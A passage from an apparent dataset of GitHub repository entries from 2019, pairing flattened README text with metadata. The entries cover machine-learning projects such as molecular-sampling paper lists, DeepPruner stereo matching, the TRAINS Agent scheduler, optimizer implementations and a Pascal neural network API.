Protein Conformational Landscapes https pubs acs org doi abs 10 1021 acs jpcb 8b06521 Zahra Shamsi Kevin J Cheng Diwakar Shukla 2018 This paper from UIUC used reinforcement learning to adaptively biase the sampling potential The action in this RL problem is to pick new structures to start a swarm of simulations and the reward function is how far order parameters sample the landscape Boltzmann generators Sampling equilibrium states of many body systems with deep learning https science sciencemag org content 365 6457 eaaw1147 Frank Noe Simon Olsson Jonas Kohler Hao Wu 2019 This paper from Freie Universitt Berlin Rice Univ and Tongji Univ used a generative model Boltzmann generator machine to generate unbiased equilibrium samples from different metastable states in one shot This model is said to overcome rare event sampling problems in many body systems Targeted Adversarial Learning Optimized Sampling https pubs acs org doi 10 1021 acs jpclett 9b02173 Justin Zhang Yi Isaac Yang Frank No 2019 The authors from Freie Universitt Berlin use adversarial training to steer a molecular dynamics ensemble towards a desired target distribution overcoming rare event sampling problems Neural networks based variationally enhanced sampling https doi org 10 1073 pnas 1907975116 Luigi Bonati Yue Yu Zhang Michele Parrinello 2019 The authors from ETH Zurich Universita della Svizzera italiana MARVEL Switzerland and Italian Institute of Technology presented a NN based bias potential for enhanced sampling building on their previous work of variationally enhanced sampling Deep learning provides an expressive tool for mapping from CV to actual bias potential 3 Learn collective variables Machine Learning Based Dimensionality Reduction Facilitates Ligand Diffusion Paths Assessment A Case of Cytochrome P450cam https pubs acs org doi abs 10 1021 acs jctc 6b00212 Jakub Rydzewski and Wieslaw Nowak 2016 The authors from Nicolaus Copernicus University showed how t distributed stochastic neighbor embedding t SNE can be applied to analyze the process of camphor unbinding from cytochrome P450cam via multiple reaction pathways Transferable Neural Networks for Enhanced Sampling of Protein Dynamics http dx doi org 10 1021 acs jctc 8b00025 Mohammad M Sultan Hannah K Wayment Steele Vijay S Pande 2018 The authors from Stanford Univ used variational autoencoder with time lagged information to learn the collective variable in latent space They then used the latent space representation in well tempered ensemble metadynamics The authors showed such learned latend space is transferrable for proteins with certain mutations or between force fields Molecular enhanced sampling with autoencoders On the fly collective variable discovery and accelerated free energy landscape exploration https doi org 10 1002 jcc 25520 Wei Chen Andrew L Ferguson 2018 The authors from UIUC did on the fly CV discovery by using an autoencoder so called chicken and egg problem The bottleneck in autoencoder maps the intrinsic manifold Each time after,2019-10-04T00:21:56Z,2019-12-12T04:09:51Z,n/a,sha256feng,User,18,77,10,56,master,sha256feng#franknoe#jakryd,3,0,0,0,0,0,2
uber-research,DeepPruner,iccv2019#patchmatch#pytorch#real-time#stereo-matching#stereo-vision,DeepPruner Learning Efficient Stereo Matching via Differentiable PatchMatch This repository releases code for our paper DeepPruner Learning Efficient Stereo Matching via Differentiable PatchMatch https arxiv org abs 1909 05845 Table of Contents DeepPruner DeepPruner Differentiable Patch Match DifferentiablePatchMatch Requirements Major Dependencies Requirements Citation Citation DeepPruner An efficient Real Time Stereo Matching algorithm which takes as input 2 images and outputs a disparity or depth map readmeimages DeepPruner png Results Metrics KITTI http www cvlibs net datasets kitti evalsceneflow php benchmark stereo Results competitive to SOTA while being real time 8x faster than SOTA SOTA among published real time algorithms readmeimages KITTItestset png readmeimages CRP png readmeimages uncertaintyvis png ETH3D https www eth3d net lowrestwoview mask all metric bad 2 0 SOTA among all ROB entries SceneFlow 2nd among all published algorithms while being 8x faster than the 1st Robust Vision Challenge http www robustvision net index php Overall ranking 1st Runtime 62ms for DeepPruner fast 180ms for DeepPruner best Cuda Memory Requirements 805MB for DeepPruner best Differentiable Patch Match Fast algorithm for finding dense nearest neighbor correspondences between patches of images regions Differentiable version of the generalized Patch Match algorithm Barnes et al https gfx cs princeton edu pubs Barnes2010TGP index php More details in the corresponding folder README Requirements Major Dependencies Pytorch 0 4 0 Python2 7 torchvision 0 2 0 Citation If you use our source code or our paper please consider citing the following inproceedingsDuggal2019ICCV title DeepPruner Learning Efficient Stereo Matching via Differentiable PatchMatch author Shivam Duggal and Shenlong Wang and Wei Chiu Ma and Rui Hu and Raquel Urtasun booktitle ICCV year 2019 Correspondences to Shivam Duggal Shenlong Wang Wei Chiu Ma,2019-10-15T23:48:59Z,2019-12-12T08:48:53Z,Python,uber-research,Organization,6,69,5,11,master,ShivamDuggal4,1,0,0,1,6,0,0
muellerzr,Practical-Deep-Learning-for-Coders-2.0,n/a,Practical Deep Learning for Coders 2 0 My version of fastai s Practical Deep Learning for Coders for the fastai 2 0 library This course is originally done by Jeremy Howard and Rachel Thomas The course can be found here https course fast ai The Fast AI forums can be found at https forums fast ai The notebooks will run in google colab,2019-10-25T02:35:27Z,2019-12-15T00:49:58Z,Jupyter Notebook,muellerzr,User,9,68,3,64,master,muellerzr,1,0,0,0,1,0,0
dipanjanS,deep_transfer_learning_nlp_dhs2019,n/a,https i imgur com lzJdggI png https i imgur com 4PxqDeW png Applying Deep Transfer Learning for Natural Language Processing NLP Handling tough real world problems in Natural Language Processing NLP include tackling with class imbalance and the lack of availability of enough labeled data for training Thanks to the recent advancements in deep transfer learning in NLP we have been able to make rapid strides in not only tackling these problems but also leverage these models for diverse downstream NLP tasks The intent of this hack session is two fold we will first look at various SOTA models in deep transfer learning for NLP with hands on examples and then talk about how these models were used in a real world industry use case around proactive detection of security vulnerabilities Part 1 Deep Transfer Learning Techniques for NLP In this first part of this hands on hack session we will take a trip through the various advances in deep transfer learning for NLP including the following Pre trained word embeddings for Deep Learning Models FastText with CNNsBi directional LSTMs Attention Universal Embeddings Sentence Encoders NNLMs Transformers BERT DistilBERT We will take a benchmark classification dataset and train and compare the performance of these models All examples will be showcased using Python and leveraging the latest and best of TensorFlow 2 0 Part 2 Industry Case Study Proactive Identification of Software Dependency Vulnerabilities The second part of this hack session will briefly cover a real world industry use case around proactive detection of security vulnerabilities in software The idea here is that open source and third party libraries dependencies can often cost any enterprise dearly since they are not often aware of potential vulnerabilities which might be present in these dependencies Can we leverage deep learning to proactively find out and flag dependencies having a sign of a potential vulnerability before it becomes a serious issue Example the requests library from python was one of the most vulnerable dependencies in the recent past which a lot of developers were not even aware of This solution uses state of the art deep learning models in NLP like BERT to go through public data including GitHub events data Bugzilla Mailing list conversations to predict probable security vulnerabilities This should give the audience an idea of how we leveraged deep transfer learning for NLP in a very unique domain and also tackle problems like extreme class imbalance Key Takeaways from this Hack Session Learn to train and fine tune pre trained SOTA models including BERT and DistilBERT for downstream NLP tasks like classification Examples showcased using the latest and best in TensorFlow 2 0 TF Hub and the excellent Transformers framework Learn about a real world industry use case on predicting software dependency vulnerabilities using these techniques Hack Session Examples Powered By https i imgur com WTbqmnR png Acknowledgements Hugging Face https huggingface co for the awesome transformers https github com huggingface transformers framework Google https about google for giving us Tensorflow 2 0 https www tensorflow org Sebastian Ruder http ruder io for a lot of excellent images resources and his thesis on transfer learning Jay Alammar http jalammar github io for his excellent interpretations of transformers BERT GPT 2 and more All the researchers and practitioners who worked hard to build all the models leveraged in this tutorial The entire team at Red Hat https www redhat com en CodeReady Analytics https github com fabric8 analytics who I worked with for the showcased case study on probable vulnerability prediction,2019-10-28T12:34:09Z,2019-12-14T00:45:12Z,Jupyter Notebook,dipanjanS,User,7,66,37,15,master,dipanjanS,1,0,0,1,0,0,0
allegroai,trains-agent,cluster-manager#deep-learning#deeplearning#devops#kubernetes#machine-learning#mlops#trains,TRAINS Agent Deep Learning DevOps For Everyone Now supports all platforms Linux macOS and Windows All the Deep Learning DevOps your research needs and then some Because ain t nobody got time for that GitHub license https img shields io github license allegroai trains agent svg https img shields io github license allegroai trains agent svg PyPI pyversions https img shields io pypi pyversions trains agent svg https img shields io pypi pyversions trains agent svg PyPI version shields io https img shields io pypi v trains agent svg https img shields io pypi v trains agent svg PyPI status https img shields io pypi status trains agent svg https pypi python org pypi trains agent TRAINS Agent is an AI experiment cluster solution It is a zero configuration fire and forget execution agent which combined with trains server provides a full AI cluster solution Full AutoML in 5 steps 1 Install the TRAINS server https github com allegroai trains agent or use our open server https demoapp trains allegro ai 2 pip install trainsagent install installing the trains agent the TRAINS agent on any GPU machine on premises cloud 3 Add TRAINS https github com allegroai trains to your code with just 2 lines run it once on your machine laptop 4 Change the parameters using the trains agent in the UI schedule for execution using the trains agent or automate with an AutoML pipeline automl and orchestration pipelines 5 chartwithdownwardstrend chartwithupwardstrend eyes beer Using the TRAINS agent you can now set up a dynamic cluster with epsilon DevOps epsilon Because we are scientists triangularruler and nothing is really zero work Experience TRAINS live at https demoapp trains allegro ai https demoapp trains allegro ai Simple Flexible Experiment Orchestration The TRAINS Agent was built to address the DL ML R D DevOps needs Easily add remove machines from the cluster Reuse machines without the need for any dedicated containers or images Combine GPU resources across any cloud and on prem No need for yaml json template configuration of any kind User friendly UI Manageable resource allocation that can be used by researchers and engineers Flexible and controllable scheduler with priority support Automatic instance spinning in the cloud coming soon But K8S We think Kubernetes is awesome Combined with KubeFlow it is a robust solution for production grade DevOps We ve observed however that it can be a bit of an overkill as an R D DL ML solution If you are considering K8S for your research also consider that you will soon be managing hundreds of containers In our experience handling and building the environments having to package every experiment in a docker managing those hundreds or more containers and building pipelines on top of it all is very complicated also its usually out of scope for the research team and overwhelming even for the DevOps team We feel there has to be a better way that can be just as powerful for R D and at the same time allow integration with K8S when the need arises If you already have a K8S cluster for AI detailed instructions on how to integrate TRAINS into your K8S cluster are coming soon Using the TRAINS Agent Full scale HPC with a click of a button TRAINS Agent is a job scheduler that listens on job queue s pulls jobs sets the job environments executes the job and monitors its progress Any Draft experiment can be scheduled for execution by a TRAINS agent A previously run experiment can be put into Draft state by either of two methods Using the Reset action from the experiment right click context menu in the TRAINS UI This will clear any results and artifacts the previous run had created Using the Clone action from the experiment right click context menu in the TRAINS UI This will create a new Draft experiment with the same configuration as the original experiment An experiment is scheduled for execution using the Enqueue action from the experiment right click context menu in the TRAINS UI and selecting the execution queue See creating an experiment and enqueuing it for execution from scratch Once an experiment is enqueued it will be picked up and executed by a TRAINS agent monitoring this queue The TRAINS UI Workers Queues page provides ongoing execution information Workers Tab Monitor you cluster Review available resources Monitor machines statistics CPU GPU Disk Network Queues Tab Control the scheduling order of jobs Cancel or abort job execution Move jobs between execution queues What The TRAINS Agent Actually Does The TRAINS agent executes experiments using the following process Create a new virtual environment or launch the selected docker image Clone the code into the virtual environment or inside the docker Install python packages based on the package requirements listed for the experiment Special note for PyTorch The TRAINS agent will automatically select the torch packages based on the CUDAVERSION environment variable of the machine Execute the code while monitoring the process Log all stdout stderr in the TRAINS UI including the cloning and installation process for easy debugging Monitor the execution and allow you to manually abort the job using the TRAINS UI or in the unfortunate case of a code crash catch the error and signal the experiment has failed System Design Flow text GPU Machine Development Machine Data Scientist s TRAINS Agent DL ML Code WEB UI DL ML Code User Clones Exp 1 into Exp 2 TRAINS Auto Magically Creates Exp 1 The TRAINS Agent User Change Hyper Parameters Pulls Exp 2 setup the environment clone code Start execution with the new set of Hyper Parameters v TRAINS SERVER Experiment 1 Execution Queue Experiment 2 User Send Exp 2 Execute Exp 2 For Execution TRAINS SERVER Installing the TRAINS Agent bash pip install trainsagent TRAINS Agent Usage Examples Full Interface and capabilities are available with bash trains agent help trains agent daemon help Configuring the TRAINS Agent bash trains agent init Note The TRAINS agent uses a cache folder to cache pip packages apt packages and cloned repositories The default TRAINS Agent cache folder is trains See full details in your configuration file at trains conf Note The TRAINS agent extends the TRAINS configuration file trains conf They are designed to share the same configuration file see example here docs trains conf Running the TRAINS Agent For debug and experimentation start the TRAINS agent in foreground mode where all the output is printed to screen bash trains agent daemon queue default foreground For actual service mode all the stdout will be stored automatically into a temporary file no need to pipe bash trains agent daemon queue default GPU allocation is controlled via the standard OS environment NVIDIAVISIBLEDEVICES or gpus flag or disabled with cpu only If no flag is set and NVIDIAVISIBLEDEVICES variable doesn t exist all GPU s will be allocated for the trains agent If cpu only flag is set or NVIDIAVISIBLEDEVICES is an empty string no gpu will be allocated for the trains agent Example spin two agents one per gpu on the same machine bash trains agent daemon gpus 0 queue default trains agent daemon gpus 1 queue default Example spin two agents pulling from dedicated dualgpu queue two gpu s per agent bash trains agent daemon gpus 0 1 queue dualgpu trains agent daemon gpus 2 3 queue dualgpu Starting the TRAINS Agent in docker mode For debug and experimentation start the TRAINS agent in foreground mode where all the output is printed to screen bash trains agent daemon queue default docker foreground For actual service mode all the stdout will be stored automatically into a file no need to pipe bash trains agent daemon queue default docker Example spin two agents one per gpu on the same machine with default nvidia cuda docker bash trains agent daemon gpus 0 queue default docker nvidia cuda trains agent daemon gpus 1 queue default docker nvidia cuda Example spin two agents pulling from dedicated dualgpu queue two gpu s per agent with default nvidia cuda docker bash trains agent daemon gpus 0 1 queue dualgpu docker nvidia cuda trains agent daemon gpus 2 3 queue dualgpu docker nvidia cuda Starting the TRAINS Agent Priority Queues Priority Queues are also supported example use case High priority queue importantjobs Low priority queue default bash trains agent daemon queue importantjobs default The TRAINS agent will first try to pull jobs from the importantjobs queue only then it will fetch a job from the default queue Adding queues managing job order within a queue and moving jobs between queues is available using the Web UI see example on our open server https demoapp trains allegro ai workers and queues queues How do I create an experiment on the TRAINS server Integrate TRAINS https github com allegroai trains with your code Execute the code on your machine Manually PyCharm Jupyter Notebook As your code is running TRAINS creates an experiment logging all the necessary execution information Git repository link and commit ID or an entire jupyter notebook Git diff were not saying you never commit and push but still Python packages used by your code including specific versions used Hyper Parameters Input Artifacts You now have a template of your experiment with everything required for automated execution In the TRAINS UI Right click on the experiment and select clone A copy of your experiment will be created You now have a new draft experiment cloned from your original experiment feel free to edit it Change the Hyper Parameters Switch to the latest code base of the repository Update package versions Select a specific docker image to run in see docker execution mode section Or simply change nothing to run the same experiment again Schedule the newly created experiment for execution Right click the experiment and select enqueue AutoML and Orchestration Pipelines The TRAINS Agent can also be used to implement AutoML orchestration and Experiment Pipelines in conjunction with the TRAINS package Sample AutoML Orchestration examples can be found in the TRAINS example automl https github com allegroai trains tree master examples automl folder AutoML examples Toy Keras training experiment https github com allegroai trains blob master examples automl automlbasetemplatekerassimple py In order to create an experiment template in the system this code must be executed once manually Random Search over the above Keras experiment template https github com allegroai trains blob master examples automl automlrandomsearchexample py This example will create multiple copies of the Keras experiment template with different hyper parameter combinations Experiment Pipeline examples First step experiment https github com allegroai trains blob master examples automl taskpipingexample py This example will process data and once done will launch a copy of the second step experiment template Second step experiment https github com allegroai trains blob master examples automl toybasetask py In order to create an experiment template in the system this code must be executed once manually,2019-10-25T19:17:48Z,2019-12-14T22:04:36Z,Python,allegroai,Organization,8,54,18,11,master,allegroai-git,1,3,3,1,1,0,0
M3DV,Kickstart,beginners-guide#competitions#courses#instructions#pytorch-template,Learning schedule This learning schedule is sorted out for reseachers or whoever interested in machine learning deep learning computer vision It s also most welcomed for instructors to refer to this schedule to train beginner students Each course listed below takes about two weeks to finish if you are fully dedicated to it Introduction The skills you need to develop a machine learning deep learning computer vision project include Coding skills Coding is not the objective but the tool Without the tool nothing can be built Mathematics Math is the foundation of machine learning that you can t evade among which statistics and probability are the most important Machine learning algorithms which is the focus of most research or competitions Paper reading and writing which involves English proficiency and professionalisim You may not necesssarily publish a paper on a journal or a conference However to keep up with others work and report your work you have to be familiar with how to read and write a paper Beginner These courses are for beginners It s suggested to follow the order below Try to finish the coding and mathematics homework in each course It helps a lot Andrew Ng Stanford s Machine Learning Homepage https www coursera org learn machine learning video link Youtube https www youtube com watch v PPLop4L2eGk list PLLssT5zDsK h9vYZkQkYNWcItqhlRJLN Bilibili https www bilibili com video av9912938 from search seid 15017482190596014618 Hsuan Tien Lin NTU s Machine Learning Foundations Homepage https www csie ntu edu tw htlin course mlfound18fall video link Youtube https www youtube com playlist list PLXVfgk9fNX2I7tB6oIINGBmW50rrmFTqf Bilibili https www bilibili com video av12463015 from search seid 2676600341812801404 Hsuan Tien Lin NTU s Machine Learning Techniques Homepage https www csie ntu edu tw htlin course mltech18spring video link Youtube https www youtube com playlist list PLXVfgk9fNX2IQOYPmqjqWsNUFl2kpk1U2 Bilibili https www bilibili com video av12469267 from search seid 2676600341812801404 Feifei Li Stanford s Computer Vision CS231n Homepage http cs231n stanford edu video link Youtube https www youtube com playlist list PL3FW7Lu3i5JvHM8ljYj zLfQRF3EO8sYv Bilibili https www bilibili com video av13260183 from search seid 14364502991437979266 After finishing the above courses it s highly suggested to join some simple competitions before you keep going on Kaggle https www kaggle com a well known data science competition website You can refer to others code for inspiration Free GPU resources are also available on Kaggle For beginners the Getting Started category is the best place to obtain project experience and practice coding skills The following two competitions are good options Titanic Machine Learning from Disaster https www kaggle com c titanic A classification task based on structured data Digit Recognizer https www kaggle com c digit recognizer A classification task based on hand written digit images A convolutional neural network might be involved For this competition we provide some reference code https github com LinguoLi mnisttutorial with different mahcine learning computing package Intermediate Now we need to expand our sight to the current research topics in machine learning deep learning computer vision Hung yi Lee NTU s Deep Learning Homepage http speech ee ntu edu tw tlkagk courses html video link Youtube https www youtube com playlist list PLJVel3uVTsPMxPbjeX7PicgWbY7F8wW9 Bilibili https www bilibili com video av9770302 By far you should be familiar with the basic concepts of machine learning deep learning computer vision You might need to participate in a real project in a lab at school choose a reputed lab carefully or in a IT company You may also consider join a more advanced competition on Kaggle https www kaggle com Here we provide a PyTorch coding template https github com seanywang0408 PyTorch Template in python for developing a real project Advanced Don t rush to dig into these advanced courses These courses are more specific for certain topics Only after you have several project experiences can these advanced courses help you build up a systematic sense of these topics Yida Xu UTS s Probabilities and Machine Learning video link Youtube https www youtube com channel UConITmGn5PFr0hxTI2tWD4Q feed Bilibili https www bilibili com video av12802062 Hung yi Lee NTU s GAN 2018 YouTube https www youtube com playlist list PLJVel3uVTsMq6JEFPW35BCiOQTsoqwNw Hung yi Lee NTU s Next Step of Machine Learning YouTube https www youtube com playlist list PLJVel3uVTsOKZK5L0IvEQoL1JefRL4 CS 294 131 Trustworthy Deep Learning Homepage https berkeley deep learning github io cs294 131 s19 CMU 10 708 PGM 19 by Eric Xing Homepage https sailinglab github io pgm spring 2019 Berkely Deep RL Bootcamp Homepage https sites google com view deep rl bootcamp lectures CS294 158 Deep Unsupervised Learning Spring 2019 Homepage https sites google com view berkeley cs294 158 sp19 home Udacity s Cuda Homepage https classroom udacity com courses cs344 Cousera s Programming Language Homepage https www coursera org learn programming languages Udacity s Design of Computer Programs Homepage https classroom udacity com courses cs212 lessons 48688918 concepts 482769590923 At this point you have mastered the basic skill and knowledge required for machine learning deep learning computer vision research But there are still so much unknown placed waiting for you to explore What you learn here merely provides you with the way leading to those places Begin you adventure now And enjoy the beauty of maching learning Ads Tools git best tutorial I ve read in Chinese https gitbook tw haven t found a counterpart in English TODO How to use remote server How to set up a brand new machine from installing Linux to installing Pytorch Here is a rough instruction in Chinese md Here is the packages list required to set up a system for machine learning research packages for a ML system with links Advanced coding courses Papers reading and writing Code convention Any advice or comments to improve this learning schedule is most welcomed Maintainer Xiaoyang Huang https github com seanywang0408 Contributors Jiancheng Yang https github com duducheng who provides the primary study route and first start this project Linguo Li https github com LinguoLi who provides the MNIST reference code and packages list,2019-09-24T06:35:13Z,2019-12-13T07:15:01Z,n/a,M3DV,Organization,4,45,13,31,master,seanywang0408,1,0,0,0,0,0,1
nicklashansen,neural-net-optimization,deep-learning#optimization-algorithms#pytorch,Optimization for Deep Learning This repository contains PyTorch implementations of popular recent optimization algorithms for deep learning including SGD SGD w momentum SGD w Nesterov momentum SGDW RMSprop Adam Nadam Adam w L2 regularization AdamW RAdam RAdamW Gradient Noise Gradient Dropout Learning Rate Dropout and Lookahead with SGD and Adam as inner optimizers Related papers Material in this repository has been developed as part of a special course study This is the tentative list of papers that we discuss An Overview of Gradient Descent Optimization Algorithms https arxiv org abs 1609 04747 Optimization Methods for Large Scale Machine Learning https arxiv org abs 1606 04838 On the importance of initialization and momentum in deep learning https www cs toronto edu fritz absps momentum pdf Aggregated Momentum Stability Through Passive Damping https arxiv org abs 1804 00325 ADADELTA An Adaptive Learning Rate Method https arxiv org abs 1212 5701 RMSprop http www cs toronto edu tijmen csc321 slides lectureslideslec6 pdf Adam A Method for Stochastic Optimization https arxiv org abs 1412 6980 On the Convergence of Adam and Beyond https arxiv org abs 1904 09237 Decoupled Weight Decay Regularization https arxiv org abs 1711 05101 On the Variance of the Adaptive Learning Rate and Beyond https arxiv org abs 1908 03265v1 Incorporating Nesterov Momentum Into Adam https openreview net pdf id OM0jvwB8jIp57ZJjtNEZ Adaptive Gradient Methods with Dynamic Bound of Learning Rate https arxiv org abs 1902 09843 On the Convergence of AdaBound and its Connection to SGD https arxiv org abs 1908 04457v1 Lookahead Optimizer k steps forward 1 step back https arxiv org abs 1907 08610 The Marginal Value of Adaptive Gradient Methods in Machine Learning https arxiv org abs 1705 08292 Why Learning of Large Scale Neural Networks Behaves Like Convex Optimization https arxiv org abs 1903 02140v1 Towards Explaining the Regularization Effect of Initial Large Learning Rate in Training Neural Networks https arxiv org abs 1907 04595 Curriculum Learning in Deep Neural Networks https arxiv org abs 1904 12887 HOGWILD A Lock Free Approach to Parallelizing Stochastic Gradient Descent https arxiv org abs 1106 5730 Adding Gradient Noise Improves Learning for Very Deep Networks https arxiv org abs 1511 06807 Learning Rate Dropout https arxiv org abs 1912 00144 How to run You can run the experiments and algorithms by calling e g python main py numepochs 30 dataset cifar numtrain 50000 numval 2048 lrschedule True with arguments as specified in the main py file The algorithms can be run on two different datasets MNIST and CIFAR 10 For MNIST a small MLP is used for proof of concept whereas a 808 458 parameter CNN is used for CIFAR 10 You may optionally decrease the size of the dataset and or number of epochs to decrease computational complexity but the arguments given above were used to produce the results shown here Results Below you will find our main results As for all optimization problems the performance of particular algorithms is highly dependent on the problem details as well as hyper parameters While we have made no attempt at fine tuning the hyper parameters of individual optimization methods we have kept as many hyper parameters as possible constant to better allow for comparison Wherever possible default hyper parameters as proposed by original authors have been used When faced with a real application one should always try out a number of different algorithms and hyper parameters to figure out what works better for your particular problem cifarsgd https raw githubusercontent com nicklashansen neural net optimization master results losscifarsgd png cifarrmspropadam https raw githubusercontent com nicklashansen neural net optimization master results losscifarrmspropadam png cifaradamweightdecay https raw githubusercontent com nicklashansen neural net optimization master results losscifaradamweightdecay png cifaradam https raw githubusercontent com nicklashansen neural net optimization master results losscifaradam png cifarlrd https raw githubusercontent com nicklashansen neural net optimization master results losscifarlrd png cifargradnoise https raw githubusercontent com nicklashansen neural net optimization master results losscifargradnoise png cifarlookahead https raw githubusercontent com nicklashansen neural net optimization master results losscifarlookahead png,2019-10-24T13:39:18Z,2019-12-14T18:31:06Z,Python,nicklashansen,User,1,43,3,93,master,nicklashansen#CoRiis,2,0,0,0,0,0,0
gautamkumarjaiswal,videoClassification,n/a,Video Classification Real time video classification using Deep Learning Download complete folder and install packages from requirements txt There may be some additional packages if you want to skip those then you have to manually select else you can install all using pip install r requirements txt To train model from sketch use train py To test pre trained model use predictvideo py before testing please download trained model and sample test video from google drive link given in the article To test trained model using webcam real time video use predictvideorealtime py For more detail kindly visit article published at Medium https towardsdatascience com average rolling based real time calamity detection using deep learning ae51a2ffd8d2 Edit Database collected to train model is now available at https drive google com file d 1NvTyhUsrFbL91E10EPm38IjoCg6E2c6q view usp sharing Database size 1 77GB Number of classes 4 1 Cyclone 928 images 2 Earthquake 1350 images 3 Flood 1073 images 4 Wildfire 1077 images Another application of same project to detect Robbery Accident and Fire is at https drive google com file d 11KBgDW2yOxhJnUMiyBkBzXDPXhVmvCt view usp sharing Database size 987MB Number of classes 3 1 Robbery 2073 images 2 Accident 887 images 3 Fire 1405 images 1 Image samples are collected from google therefore pre processing may be required 2 Some image samples may be irrelevant therefore remove it before training model 3 As the number of images in each class is different which may cause a biased result Kindly balance it or use an appropriate technique such as Stratified k fold to train the model 4 Images may be subjected to copyright,2019-09-25T08:50:23Z,2019-10-23T02:54:44Z,Python,gautamkumarjaiswal,User,5,39,14,14,master,gautamkumarjaiswal#erjanmx#dependabot[bot],3,0,0,1,0,1,2
joaopauloschuler,neural-api,artificial#artificial-intelligence#artificial-neural-networks#cifar-10#cifar10#computer-vision#deep#delphi#densenet#fpc#free#free-pascal#intelligence#lazarus#learning#network#neural#neural-network#opencl#pascal,CAI NEURAL API VERSION https img shields io github v release joaopauloschuler neural api https github com joaopauloschuler neural api releases CAI NEURAL API is a pascal based neural network API optimized for AVX AVX2 and AVX512 instruction sets plus OpenCL capable devices including AMD Intel and NVIDIA This API has been tested under Windows and Linux This project is a subproject from a bigger and older project called CAI https sourceforge net projects cai and is sister to Keras based K CAI NEURAL API https github com joaopauloschuler k neural api Why Pascal Compiled pascal code is super fast This API can outperform some major APIs in some architectures Pascal is easy to learn and easy to make a readable and understandable source code You ll be able to make super fast native code and at the same time have a readable code Prerequisites You ll need Lazarus https www lazarus ide org development environment If you have an OpenCL capable device you ll need its OpenCL drivers Will It Work with Delphi This project is Lazarus https www lazarus ide org based That said as of release v0 962 https github com joaopauloschuler neural api releases tag v0 962 a number of units do compile with Delphi and you can create and run neural networks with Delphi You ll be able to compile these units with Delphi neuralvolume neuralnetwork neuralab neuralabfun neuralbit neuralbyteprediction neuralcache neuraldatasets neuralgeneric neuralplanbuilder and neuralfit Installation Clone this project add the neural folder to your Lazarus unit search path and you ll be ready to go How Does the Code Look like for a CIFAR 10 Classification Example This is an example for image classification NN TNNet Create NN AddLayer TNNetInput Create 32 32 3 NN AddLayer TNNetConvolutionReLU Create 16 5 0 0 NN AddLayer TNNetMaxPool Create 2 NN AddLayer TNNetConvolutionReLU Create 32 5 0 0 NN AddLayer TNNetMaxPool Create 2 NN AddLayer TNNetConvolutionReLU Create 32 5 0 0 NN AddLayer TNNetLayerFullConnectReLU Create 32 NN AddLayer TNNetFullConnectLinear Create NumClasses NN AddLayer TNNetSoftMax Create CreateCifar10Volumes ImgTrainingVolumes ImgValidationVolumes ImgTestVolumes WriteLn Neural Network will minimize error with WriteLn Layers NN CountLayers WriteLn Neurons NN CountNeurons WriteLn Weights NN CountWeights NeuralFit TNeuralImageFit Create NeuralFit InitialLearningRate fLearningRate NeuralFit Inertia fInertia NeuralFit Fit NN ImgTrainingVolumes ImgValidationVolumes ImgTestVolumes NumClasses batchsize128 epochs100 Documentation The documentation is under construction and is currently composed by Introductory Examples Youtube Videos Advanced Examples Introductory Examples Some recommended introductory source code examples are Training a neural network to learn boolean functions AND OR and XOR with neuralfit unit https github com joaopauloschuler neural api tree master examples XorAndOr Training a neural network to learn boolean functions AND OR and XOR without neuralfit unit https sourceforge net p cai svncode HEAD tree trunk lazarus experiments supersimple supersimple lpr Simple CIFAR 10 Image Classifier https github com joaopauloschuler neural api tree master examples SimpleImageClassifier Open In Colab https colab research google com assets colab badge svg https colab research google com github joaopauloschuler neural api blob master examples SimpleImageClassifier SimpleImageClassifierCPU ipynb Simple CIFAR 10 Image Classifier with OpenCL https github com joaopauloschuler neural api tree master examples SimpleImageClassifierGPU Open In Colab https colab research google com assets colab badge svg https colab research google com github joaopauloschuler neural api blob master examples SimpleImageClassifierGPU SimpleImageClassifierGPU ipynb Many neural network architectures for CIFAR 10 image classification https sourceforge net p cai svncode HEAD tree trunk lazarus experiments testcnnalgo testcnnalgo lpr MNIST https github com joaopauloschuler neural api tree master examples SimpleMNist Fashion MNIST https github com joaopauloschuler neural api tree master examples SimpleFashionMNIST and CIFAR 100 https github com joaopauloschuler neural api tree master examples Cifar100CaiDenseNet Youtube Videos There are some available videos Increasing Image Resolution with Neural Networks https www youtube com watch v jdFixaZ2P4w Ultra Fast Single Precision Floating Point Computing https www youtube com watch v qGnfwpKUTIQ AVX and AVX2 Code Optimization https www youtube com watch v Pnv174Vemw Some videos make referrence to uvolume unit The current neuralvolume unit used to be called uvolume This is why it s mentioned Advanced Examples Although these examples require deeper understanding about neural networks they are very interesting DenseNetBC L40 https github com joaopauloschuler neural api tree master examples DenseNetBCL40 Separable Convolutions https github com joaopauloschuler neural api tree master examples SeparableConvolution MobileNet building block Identity Shortcut Connection https github com joaopauloschuler neural api tree master examples IdentityShortcutConnection ResNet building block Open In Colab https colab research google com assets colab badge svg https colab research google com github joaopauloschuler neural api blob master examples IdentityShortcutConnection IdentityShortcutConnection ipynb Gradient Ascent https github com joaopauloschuler neural api tree master examples GradientAscent Visualizing patterns from inner neurons in image classification There are also some older code examples https sourceforge net p cai svncode HEAD tree trunk lazarus experiments that you can look at Quick View about the API This API is really big The following list gives a general idea about this API but it doesn t contain everything Input Layer TNNetInput input output 1D 2D or 3D Convolutional Layers TNNetConvolution input output 1D 2D or 3D feature size 1D or 2D TNNetConvolutionReLU input output 1D 2D or 3D feature size 1D or 2D TNNetConvolutionLinear input output 1D 2D or 3D feature size 1D or 2D TNNetPointwiseConvReLU input output 1D 2D or 3D TNNetPointwiseConvLinear input output 1D 2D or 3D TNNetDepthwiseConv input output 1D 2D or 3D TNNetDepthwiseConvReLU input output 1D 2D or 3D TNNetDepthwiseConvLinear input output 1D 2D or 3D TNNet AddSeparableConvReLU input output 1D 2D or 3D Adds a separable convolution TNNet AddSeparableConvLinear input output 1D 2D or 3D Adds a separable convolution TNNet AddConvOrSeparableConv input output 1D 2D or 3D Adds a convolution or a separable convolutions with without ReLU and normalization Fully Connected Layers TNNetFullConnect input output 1D 2D or 3D TNNetFullConnectReLU input output 1D 2D or 3D TNNetFullConnectLinear input output 1D 2D or 3D TNNetFullConnectSigmoid input output 1D 2D or 3D Locally Connected Layers TNNetLocalConnect input output 1D 2D or 3D feature size 1D or 2D TNNetLocalConnectReLU input output 1D 2D or 3D feature size 1D or 2D Min Max Avg Pools TNNetAvgPool input output 1D 2D or 3D TNNetMaxPool input output 1D 2D or 3D TNNetMinPool input output 1D 2D or 3D TNNet AddMinMaxPool input output 1D 2D or 3D Does both min and max pools and then concatenates results TNNet AddAvgMaxPool input output 1D 2D or 3D Does both average and max pools and then concatenates results Min Max Avg layers that Operate an Entire Channel and Produce Only One Result per Channel TNNetAvgChannel input 2D or 3D output 1D Calculates the channel average 